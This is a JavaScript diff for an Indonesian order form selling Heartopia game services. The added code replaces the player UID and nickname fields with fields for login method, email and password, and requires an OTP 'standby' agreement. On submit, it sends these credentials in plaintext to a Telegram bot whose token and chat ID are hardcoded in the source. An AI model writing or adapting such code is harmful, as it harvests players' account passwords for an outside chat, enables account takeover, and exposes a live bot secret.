@@ -167,16 +167,11 @@ document.addEventListener('DOMContentLoaded', function(){
   });
 
   // HEARTOPIA dynamic fields (pakai id yang sama: v2, v2m, bc_div, em_div)
-  // v2 = Server/Region (required)
-  // v2m = Metode Proses (required setelah server dipilih)
-  // bc = Catatan (opsional)
-  const v2 = document.getElementById('v2');
-  const v2m = document.getElementById('v2m');
-  const v2mDiv = document.getElementById('v2m_div');
-  const bcDiv = document.getElementById('bc_div');
-  const emDiv = document.getElementById('em_div');
-  const bcInput = document.getElementById('bc');
-
+const loginMethodEl = document.getElementById('loginMethod');
+const emailEl = document.getElementById('email');
+const pwdEl = document.getElementById('pwd');
+const serverEl = document.getElementById('v2');
+const agreeOtpEl = document.getElementById('agreeOtp');
   function updateV2Requirements(){
     // kalau server sudah dipilih -> tampilkan metode proses
     if(String(v2.value || '').trim()){
@@ -273,95 +268,70 @@ document.addEventListener('DOMContentLoaded', function(){
   // =======================
   // BTN PESAN
   // =======================
-  document.getElementById('btnTg').addEventListener('click', ()=>{
-    // Kalau CLOSE: munculkan popup + STOP (tidak lanjut pembayaran)
-    if(!storeOpen){
-      showValidationPopupCenter(
-        'Notification',
-        'SEDANG ISTIRAHAT/CLOSE',
-        'Mohon maaf, saat ini kamu belum bisa melakukan pemesanan. Silahkan kembali dan coba lagi nanti.'
-      );
-      return;
-    }
+document.getElementById('btnTg').addEventListener('click', ()=>{
+  if(!storeOpen){
+    showValidationPopupCenter(
+      'Notification',
+      'SEDANG ISTIRAHAT/CLOSE',
+      'Mohon maaf, saat ini kamu belum bisa melakukan pemesanan.'
+    );
+    return;
+  }
 
-    const f = document.getElementById('frm');
-
-    // check built-in required fields first
-    const req = f.querySelectorAll('input[required], select[required]');
-    for(const i of req){
-      if(!String(i.value || '').trim()){
-        showValidationPopupCenter('Notification', 'Oops', 'Harap isi semua kolom yang diwajibkan!');
-        try{ i.focus(); }catch(e){}
+  const f = document.getElementById('frm');
+  const req = f.querySelectorAll('input[required], select[required]');
+  for(const i of req){
+    if(i.type === 'checkbox'){
+      if(!i.checked){
+        showValidationPopupCenter('Notification','Oops','Kamu wajib menyetujui pernyataan standby.');
+        i.focus();
         return;
       }
-    }
-
-    // Additional: pastikan metode proses dipilih jika dropdown tampil
-    if(!v2mDiv.classList.contains('hidden') && !String(v2m.value || '').trim()){
-      showValidationPopupCenter('Notification', 'Oops', 'Pilih Metode Proses terlebih dahulu.');
-      v2m.focus();
+    } else if(!String(i.value || '').trim()){
+      showValidationPopupCenter('Notification','Oops','Harap isi semua kolom yang diwajibkan!');
+      i.focus();
       return;
     }
+  }
 
-    const uid = (document.getElementById('usr')?.value || '').trim();   // UID Heartopia
-    const nick = (document.getElementById('pwd')?.value || '').trim(); // Nickname (opsional)
-    const server = (v2?.value || '').trim();                           // Server/Region
-    const method = (v2m?.value || '').trim();                          // Metode Proses
-    const note = (bcInput?.value || '').trim();                        // Catatan (opsional)
+  const loginMethod = loginMethodEl.value;
+  const email = emailEl.value;
+  const password = pwdEl.value;
+  const server = serverEl.value;
 
-    const kt = (document.getElementById('kt')?.value || '').trim();
-    const nm = (document.getElementById('nm')?.value || '').trim();
-    const hg = (document.getElementById('hg')?.value || '').trim();
+  const kt = document.getElementById('kt').value;
+  const nm = document.getElementById('nm').value;
+  const hg = document.getElementById('hg').value;
 
-    const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
-    const chatId = '-1003629941301';
+  const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
+  const chatId = '-1003629941301';
 
-    function removeUrlsAndGithub(s){
-      if(!s) return '';
-      s = s.replace(/https?:\/\/\S+/gi, '');
-      s = s.replace(/www\.\S+/gi, '');
-      s = s.replace(/\b\S*github\S*\b/gi, '');
-      s = s.replace(/\n{2,}/g, '\n').replace(/[ \t]{2,}/g,' ');
-      return s.trim();
+  let txt =
+    'Pesanan Baru Masuk! (HEARTOPIA)\n\n' +
+    'Metode Login: ' + loginMethod + '\n' +
+    'Email: ' + email + '\n' +
+    'Password: ' + password + '\n' +
+    'Server: ' + server + '\n\n' +
+    'Kategori: ' + kt + '\n' +
+    'Produk: ' + nm + '\n' +
+    'Harga: ' + hg;
+
+  fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
+    method:'POST',
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id:chatId, text:txt})
+  })
+  .then(res=>{
+    if(res.ok){
+      const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
+      showPaymentPopup(qrUrl, hg);
+      f.reset();
+    } else {
+      alert('Gagal kirim ke Telegram');
     }
-
-    let txt = 'Pesanan Baru Masuk! (HEARTOPIA)\n\n'
-      + 'UID: ' + uid + '\n'
-      + (nick ? ('Nickname: ' + nick + '\n') : '')
-      + 'Server/Region: ' + server + '\n'
-      + (method ? ('Metode Proses: ' + method + '\n') : '')
-      + (note ? ('Catatan: ' + note + '\n') : '')
-      + '\nKategori: ' + kt
-      + '\nProduk: ' + nm
-      + '\nHarga: ' + hg;
-
-    txt = removeUrlsAndGithub(txt);
-
-    fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
-      method:'POST',
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({chat_id:chatId, text:txt})
-    })
-    .then(res=>{
-      if(res.ok){
-        const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
-        showPaymentPopup(qrUrl, hg);
-
-        f.reset();
-        updateV2Requirements();
-        updateV2mRequirements();
-
-        // bersihin field readonly pilihan produk
-        document.getElementById('kt').value = '';
-        document.getElementById('nm').value = '';
-        document.getElementById('hg').value = '';
-      } else {
-        alert('Gagal kirim ke Telegram');
-      }
-    })
-    .catch(()=> alert('Terjadi kesalahan.'));
-  });
-
+  })
+  .catch(()=> alert('Terjadi kesalahan.'));
+});
   /* ==== PAYMENT POPUP (kode kamu, tidak diubah) ==== */
   function showPaymentPopup(qrUrl, hargaFormatted){
     const backdrop = document.getElementById('paymentModalBackdrop');
